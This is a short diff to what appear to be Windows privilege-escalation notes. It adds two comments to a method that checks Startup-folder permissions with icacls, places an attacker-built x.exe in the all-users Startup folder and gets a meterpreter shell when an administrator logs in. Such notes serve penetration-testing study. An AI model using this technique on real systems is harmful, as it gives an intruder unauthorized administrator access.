@@ -414,6 +414,7 @@ net localgroup administrators
 ```shell
 #in windows cmd prompt
 icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+# if Users groud has Full access F to directory this will work
 #BUILTIN\Users group has full access (F) to directory
 
 #in attacker machine
@@ -431,6 +432,7 @@ run
 
 #now copy x.exe to windows machine
 move x.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+# or using http server, to drop the file in win machine
 
 #logout and then login as administrator
 #we get a meterpreter shell now
